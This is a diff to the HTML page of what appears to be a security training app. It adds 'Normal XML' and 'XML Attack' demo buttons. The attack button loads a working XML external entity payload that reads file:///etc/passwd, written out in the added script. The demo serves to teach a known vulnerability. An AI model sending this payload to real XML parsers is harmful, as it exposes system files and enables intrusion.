@@ -15,7 +15,25 @@
 	<script src="/static/js/lumino.glyphs.js"></script>
 	<script src="/static/js/hints.js"></script>
 	<link href="https://fonts.googleapis.com/css2?family=Hind:wght@700&display=swap" rel="stylesheet">
+	<script src="/static/js/jquery.min.js"></script>
+<script>
 
+var normal = '<items><item name="item1"> item1 </item><item name="item2"> item2 </item><item name="item3"> item3 </item><item name="item4"> item4 </item></items>';
+var attack = '<!DOCTYPE item [ <!ELEMENT item ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><items><item name="item1">a</item><item name="item2">a &xxe;</item><item name="item3">c</item><item name="item4">d</item></items>';
+
+  $(document).ready(function(){
+  $("#normal").click(function(){
+      $('#textarea').text('');
+      $('#textarea').text(normal);
+  });
+  
+    $("#attack").click(function(){
+      $('#textarea').text('');
+      $('#textarea').text(attack);
+  });
+});
+
+</script>
 </head>
 
 <body>
@@ -111,14 +129,17 @@
 
 						</div>
 						<!--/.row-->
-
+						
 						<div class="row">
 							<div class="col-lg-12">
 								<h1 class="page-header">Live demonstration!</h1>
 							</div>
 						</div>
 						<!--/.row-->
-
+						<center style="margin-bottom:10px;">
+							<button id="normal" class="button btn-warning">Normal XML</button>
+							<button id="attack" class="button btn-warning">XML Attack</button>
+					  </center>
 						<div class="row">
 							<div class="col-lg-12">
 								<div class="panel panel-default">
